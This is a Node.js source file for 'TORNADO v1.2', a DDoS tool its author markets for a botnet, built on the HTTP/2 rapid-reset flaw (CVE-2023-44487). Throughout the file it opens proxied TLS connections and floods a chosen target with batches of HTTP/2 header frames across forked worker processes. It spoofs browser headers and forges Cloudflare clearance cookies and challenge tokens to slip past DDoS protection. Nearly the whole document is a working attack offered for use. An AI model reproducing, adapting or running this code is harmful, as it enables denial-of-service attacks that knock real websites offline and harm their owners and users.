// made by @rapidreset aka mitigations for mesh botnet
const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

const blockedDomain = [".gov", ".edu"];

const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];
const queryIndex = process.argv.indexOf('--query');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 1;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;

if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.log(`TORNADO v1.2 Method With RST STREAM (CVE-2023-44487) // Updated: 16.01.2024 // With love @rapidreset for mesh botnet`);
    console.log(`Example: node tornado.js GET https://target.com?q=%RAND% 120 16 proxy.txt --query 1 --cookie uh=good --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --randrate`);
    console.error(`node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy> (options: --query 1/2/3 --delay <1-100> --cookie f=f --bfm true/false --referer rand / https://target.com --postdata "user=f&pass=f" --randrate)`);
    process.exit(1);
}

let hcookie = '';

const url = new URL(target)
const proxy = fs.readFileSync(proxyfile, 'utf8').split('\n')

if (url.hostname.endsWith(blockedDomain)) {
    console.log(`Domain ${blockedDomain} blocked, if this mistake pm to tg @rapidreset`);
    process.exit(1);
}

if (!['GET', 'POST'].includes(reqmethod)) {
    console.error('Error request method only can GET/POST');
    process.exit(1);
}

if (!target.startsWith('https://')) {
    console.error('Error protocol can only https://');
    process.exit(1);
}

if (isNaN(time) || time <= 0 || time > 86400) {
    console.error('Error time can not high 86400')
    process.exit(1);
}

if (isNaN(threads) || threads <= 0 || threads > 256) {
    console.error('Error threads can not high 256')
    process.exit(1);
}

if (isNaN(ratelimit) || ratelimit <= 0 || ratelimit > 90) {
    console.error(`Error ratelimit can not high 90`)
    process.exit(1);
}

if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
    hcookie = `__cf_bm=${randstr(23)}_${randstr(19)}-${timestampString}-1-${randstr(4)}/${randstr(65)}+${randstr(16)}=; cf_clearance=${randstr(35)}_${randstr(7)}-${timestampString}-0-1-${randstr(8)}.${randstr(8)}.${randstr(8)}-0.2.${timestampString}`;
}

if (cookieValue) {
    hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
}

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9)
    frame.writeUInt32BE(payload.length << 8 | type, 0)
    frame.writeUInt8(flags, 4)
    frame.writeUInt32BE(streamId, 5)
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload])
    return frame
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0)
    const length = lengthAndType >> 8
    const type = lengthAndType & 0xFF
    let payload = ""

    if (length > 0) {
        payload = data.subarray(9, 9 + length)

        if (payload.length != length)
            return null
    }

    return {
        length,
        type,
        payload
    }
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length)
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6)
        data.writeUInt32BE(settings[i][1], i * 6 + 2)
    }
    return data
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

if (url.pathname.includes("%RAND%")) {
    const randomValue = randstr(6) + "&" + randstr(6);
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function getRandomToken(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let token = '';
    for (let i = 0; i < length; i++) {
        token += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return token;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function go() {
    const [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':')
    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {

        netSocket.once('data', () => {
            const tlsSocket = tls.connect({
                socket: netSocket,
                ALPNProtocols: ['h2', 'http/1.1'],
                servername: url.host,
				ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256',
                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256',
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3'
            }, () => {
                let streamId = 1
                let data = Buffer.alloc(0)
                let hpack = new HPACK()
                hpack.setTableSize(4096)

                const updateWindow = Buffer.alloc(4)
                updateWindow.writeUInt32BE(15663105, 0)

                const headertablesize = Math.floor(Math.random() * 2) + 65535;
                let windowSize = headertablesize;
                const condition = Math.random() < 0.5;

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, condition ? (Math.random() < 0.5 ? 65535 : 65536) : (condition ? 65536 : undefined)],
                        [2, condition ? 0 : undefined],
                        [3, condition ? 100 : undefined],
                        [4, condition ? (Math.random() < 0.5 ? 6291456 : 6291457) : undefined],
                        [5, condition ? (Math.random() < 0.5 ? 16777215 : 16777216) : undefined],
                        [6, condition ? (Math.random() < 0.5 ? 262144 : 262145) : undefined]
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData])
                    while (data.length >= 9) {
                        const frame = decodeFrame(data)
                        if (frame != null) {
                            data = data.subarray(frame.length + 9)
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1))
                            }
                            if (frame.type == 0) {
                                windowSize -= frame.length

                                if (windowSize < 60000) {
                                    let incWindow = 65536 - windowSize
                                    windowSize += incWindow
                                    const updateWindow = Buffer.alloc(4)
                                    updateWindow.writeUInt32BE(incWindow, 0)

                                    tlsSocket.write(encodeFrame(0, 8, updateWindow))
                                }
                            }
        
                            if (frame.type == 7 || frame.type == 5) {
                                tlsSocket.end(() => {
                                    tlsSocket.destroy()
                                })
                            }
        
                        } else {
                            break
                        }
                    }
                })

                tlsSocket.write(Buffer.concat(frames))

                function doWrite() {
                    if (tlsSocket.destroyed) {
                        return
                    }

                    const requests = []
                    let ratelimit;
                    if (randrate !== undefined) {
                        ratelimit = getRandomInt(27, 61);
                    } else {
                        ratelimit = process.argv[6];
                    }
                    for (let i = 0; i < ratelimit; i++) {
                        const browserVersion = getRandomInt(119, 122);
                        const fwfw = ['Google Chrome', 'Brave'];
                        const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];

                        let brandValue;
                        if (browserVersion === 119) {
                            brandValue = `"Not?A_Brand";v="24", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
                        } else if (browserVersion === 120) {
                            brandValue = `"Not_A_Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
                        } else if (browserVersion === 121) {
                            brandValue = `"Not A(Brand";v="99", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
                        }
                          else if (browserVersion === 122) {
                            brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${wfwf}";v="${browserVersion}"`;
                        }

                        const isBrave = wfwf === 'Brave';

                        const acceptHeaderValue = isBrave
                            ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
                            : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';

                        const secGpcValue = isBrave ? "1" : undefined;

                        const userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
                        const secChUa = `${brandValue}`;
                        const currentRefererValue = refererValue === 'rand' ? 'https://' + getRandomToken(6) + ".net" : refererValue;
                        const headers = Object.entries({
                            ":method": reqmethod || "GET",
                            ":authority": url.hostname,
                            ":scheme": "https",
                            ":path": query ? handleQuery(query) : url.pathname + (postdata ? `?${postdata}` : ""),
                        }).concat(Object.entries({
                            ...(Math.random() < 0.5 && { "cache-control": "max-age=0"}),
                            ...(reqmethod === "POST" && { "content-length": "0" }),
                            ...(Math.random() < 0.9 && { "priority": "u=0, i" }),
                            "sec-ch-ua": secChUa,
                            "sec-ch-ua-mobile": "?0",
                            "sec-ch-ua-platform": `"Windows"`,
                            "upgrade-insecure-requests": "1",
                            "user-agent": userAgent,
                            "accept": acceptHeaderValue,
                            ...(secGpcValue && {"sec-gpc": secGpcValue}),
                            ...(Math.random() < 0.5 && { "sec-fetch-site": currentRefererValue ? "same-origin" : "none" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
                            "sec-fetch-user": "?1",
                            "sec-fetch-dest": "document",
                            "accept-encoding": "gzip, deflate, br",
                            "accept-language": "en-US,en;q=0.7",
                            ...(hcookie && { "cookie": hcookie }),
                            ...(currentRefererValue && { "referer": currentRefererValue }),
                        }).filter(a => a[1] != null));

                        const headers2 = Object.entries({
                            ...(Math.random() < 0.3 && { 'x-client-session': 'none' }),
                            ...(Math.random() < 0.3 && { 'sec-ms-gec-version': 'undefined' }),
                            ...(Math.random() < 0.3 && { 'sec-fetch-users': '?0' }),
                            ...(Math.random() < 0.3 && { 'x-request-data': 'dynamic' }),
                            ...(Math.random() < 0.1 && { 'x-requested-with': 'XMLHttpRequest' })
                        }).filter(a => a[1] != null);

                        for (let i = headers2.length - 1; i > 0; i--) {
                            const j = Math.floor(Math.random() * (i + 1));
                            [headers2[i], headers2[j]] = [headers2[j], headers2[i]];
                        }

                        const combinedHeaders = headers.concat(headers2);

                        function handleQuery(query) {
                            if (query === '1') {
                                return url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
                            } else if (query === '2') {
                                return url.pathname + '?' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                            } else if (query === '3') {
                                return url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                            } else {
                                return url.pathname;
                            }
                        }

                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(combinedHeaders)
                        ]);

                        requests.push(encodeFrame(streamId, 1, packed, 1 | 4 | 0x20));				
                        streamId += 2		
                    }

                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        if (!err) {
                            setTimeout(() => {
                                doWrite()
                            }, 1000)
                        }
                    })
                }

                doWrite()
            }).on('error', () => {
                tlsSocket.destroy()
            })
        })

        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: keep-alive\r\n\r\n`)

    }).once('error', () => { }).once('close', () => {
        go()
    })
}

if (cluster.isMaster) {
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(`vroom vroom bbos sent ! | @cliche`);

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    setTimeout(() => process.exit(1), time * 1000);

} else {
    setInterval(go, delay);
    setTimeout(() => process.exit(1), time * 1000);
}
